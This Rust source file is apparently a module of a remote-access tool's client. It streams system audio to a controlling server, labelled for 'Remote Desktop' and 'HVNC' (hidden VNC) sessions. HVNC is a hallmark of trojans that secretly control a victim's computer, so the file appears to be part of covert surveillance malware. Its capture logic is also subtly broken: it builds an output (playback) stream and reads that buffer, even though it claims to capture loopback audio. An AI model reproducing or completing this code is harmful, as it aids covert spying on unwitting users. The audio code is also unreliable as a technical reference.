use common::packets::{RemoteDesktopAudioChunk, HVNCFrameAudioChunk, ServerboundPacket};
use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
use cpal::{Sample, SampleFormat, StreamConfig};
use once_cell::sync::Lazy;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use crate::handler::send_packet_sync;

// Remote Desktop audio state
static RD_AUDIO_ACTIVE: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
static RD_AUDIO_STOP_FLAG: Lazy<Mutex<Option<thread::JoinHandle<()>>>> = Lazy::new(|| Mutex::new(None));

// HVNC audio state
static HVNC_AUDIO_ACTIVE: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
static HVNC_AUDIO_STOP_FLAG: Lazy<Mutex<Option<thread::JoinHandle<()>>>> = Lazy::new(|| Mutex::new(None));

fn sample_to_bytes_i16(input: &[i16]) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(input.len() * 2);
    for &sample in input {
        bytes.extend_from_slice(&sample.to_le_bytes());
    }
    bytes
}

fn sample_to_bytes_u16(input: &[u16]) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(input.len() * 2);
    for &sample in input {
        let i16_sample = sample.to_sample::<i16>();
        bytes.extend_from_slice(&i16_sample.to_le_bytes());
    }
    bytes
}

fn sample_to_bytes_f32(input: &[f32]) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(input.len() * 2);
    for &sample in input {
        let i16_sample = sample.to_sample::<i16>();
        bytes.extend_from_slice(&i16_sample.to_le_bytes());
    }
    bytes
}

fn get_default_output_device() -> Option<cpal::Device> {
    let host = cpal::default_host();
    host.default_output_device()
}

// Remote Desktop audio functions
pub fn start_remote_desktop_audio() {
    stop_remote_desktop_audio();

    RD_AUDIO_ACTIVE.store(true, Ordering::Relaxed);

    let device = match get_default_output_device() {
        Some(d) => d,
        None => {
            eprintln!("No default output device available for Remote Desktop audio loopback");
            RD_AUDIO_ACTIVE.store(false, Ordering::Relaxed);
            return;
        }
    };

    let supported_config = match device.default_output_config() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to query output config for Remote Desktop audio: {}", e);
            RD_AUDIO_ACTIVE.store(false, Ordering::Relaxed);
            return;
        }
    };

    let sample_rate = supported_config.sample_rate().0;
    let channels = supported_config.channels();
    let config: StreamConfig = supported_config.clone().into();

    let handle = thread::spawn(move || {
        let err_fn = |err| {
            eprintln!("Remote Desktop audio capture error: {}", err);
        };

        let stream_result = match supported_config.sample_format() {
            SampleFormat::I16 => device.build_output_stream(
                &config,
                move |data: &mut [i16], _| {
                    if !RD_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                        return;
                    }
                    let bytes = sample_to_bytes_i16(data);
                    let timestamp = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_millis() as u64;
                    let chunk = RemoteDesktopAudioChunk {
                        timestamp,
                        sample_rate,
                        channels,
                        data: bytes,
                    };
                    let _ = send_packet_sync(ServerboundPacket::RemoteDesktopAudioChunk(chunk));
                },
                err_fn,
                None,
            ),
            SampleFormat::U16 => device.build_output_stream(
                &config,
                move |data: &mut [u16], _| {
                    if !RD_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                        return;
                    }
                    let bytes = sample_to_bytes_u16(data);
                    let timestamp = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_millis() as u64;
                    let chunk = RemoteDesktopAudioChunk {
                        timestamp,
                        sample_rate,
                        channels,
                        data: bytes,
                    };
                    let _ = send_packet_sync(ServerboundPacket::RemoteDesktopAudioChunk(chunk));
                },
                err_fn,
                None,
            ),
            SampleFormat::F32 => device.build_output_stream(
                &config,
                move |data: &mut [f32], _| {
                    if !RD_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                        return;
                    }
                    let bytes = sample_to_bytes_f32(data);
                    let timestamp = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_millis() as u64;
                    let chunk = RemoteDesktopAudioChunk {
                        timestamp,
                        sample_rate,
                        channels,
                        data: bytes,
                    };
                    let _ = send_packet_sync(ServerboundPacket::RemoteDesktopAudioChunk(chunk));
                },
                err_fn,
                None,
            ),
            _ => {
                eprintln!("Unsupported sample format for Remote Desktop audio");
                return;
            }
        };

        if let Ok(stream) = stream_result {
            if stream.play().is_ok() {
                while RD_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                    thread::sleep(Duration::from_millis(100));
                }
            }
        } else if let Err(err) = stream_result {
            eprintln!("Failed to create Remote Desktop audio stream: {}", err);
        }
    });

    *RD_AUDIO_STOP_FLAG.lock().unwrap() = Some(handle);
}

pub fn stop_remote_desktop_audio() {
    RD_AUDIO_ACTIVE.store(false, Ordering::Relaxed);
    if let Some(handle) = RD_AUDIO_STOP_FLAG.lock().unwrap().take() {
        let _ = handle.join();
    }
}

// HVNC audio functions
pub fn start_hvnc_audio() {
    stop_hvnc_audio();

    HVNC_AUDIO_ACTIVE.store(true, Ordering::Relaxed);

    let device = match get_default_output_device() {
        Some(d) => d,
        None => {
            eprintln!("No default output device available for HVNC audio loopback");
            HVNC_AUDIO_ACTIVE.store(false, Ordering::Relaxed);
            return;
        }
    };

    let supported_config = match device.default_output_config() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to query output config for HVNC audio: {}", e);
            HVNC_AUDIO_ACTIVE.store(false, Ordering::Relaxed);
            return;
        }
    };

    let sample_rate = supported_config.sample_rate().0;
    let channels = supported_config.channels();
    let config: StreamConfig = supported_config.clone().into();

    let handle = thread::spawn(move || {
        let err_fn = |err| {
            eprintln!("HVNC audio capture error: {}", err);
        };

        let stream_result = match supported_config.sample_format() {
            SampleFormat::I16 => device.build_output_stream(
                &config,
                move |data: &mut [i16], _| {
                    if !HVNC_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                        return;
                    }
                    let bytes = sample_to_bytes_i16(data);
                    let timestamp = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_millis() as u64;
                    let chunk = HVNCFrameAudioChunk {
                        timestamp,
                        sample_rate,
                        channels,
                        data: bytes,
                    };
                    let _ = send_packet_sync(ServerboundPacket::HVNCFrameAudioChunk(chunk));
                },
                err_fn,
                None,
            ),
            SampleFormat::U16 => device.build_output_stream(
                &config,
                move |data: &mut [u16], _| {
                    if !HVNC_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                        return;
                    }
                    let bytes = sample_to_bytes_u16(data);
                    let timestamp = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_millis() as u64;
                    let chunk = HVNCFrameAudioChunk {
                        timestamp,
                        sample_rate,
                        channels,
                        data: bytes,
                    };
                    let _ = send_packet_sync(ServerboundPacket::HVNCFrameAudioChunk(chunk));
                },
                err_fn,
                None,
            ),
            SampleFormat::F32 => device.build_output_stream(
                &config,
                move |data: &mut [f32], _| {
                    if !HVNC_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                        return;
                    }
                    let bytes = sample_to_bytes_f32(data);
                    let timestamp = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_millis() as u64;
                    let chunk = HVNCFrameAudioChunk {
                        timestamp,
                        sample_rate,
                        channels,
                        data: bytes,
                    };
                    let _ = send_packet_sync(ServerboundPacket::HVNCFrameAudioChunk(chunk));
                },
                err_fn,
                None,
            ),
            _ => {
                eprintln!("Unsupported sample format for HVNC audio");
                return;
            }
        };

        if let Ok(stream) = stream_result {
            if stream.play().is_ok() {
                while HVNC_AUDIO_ACTIVE.load(Ordering::Relaxed) {
                    thread::sleep(Duration::from_millis(100));
                }
            }
        } else if let Err(err) = stream_result {
            eprintln!("Failed to create HVNC audio stream: {}", err);
        }
    });

    *HVNC_AUDIO_STOP_FLAG.lock().unwrap() = Some(handle);
}

pub fn stop_hvnc_audio() {
    HVNC_AUDIO_ACTIVE.store(false, Ordering::Relaxed);
    if let Some(handle) = HVNC_AUDIO_STOP_FLAG.lock().unwrap().take() {
        let _ = handle.join();
    }
}
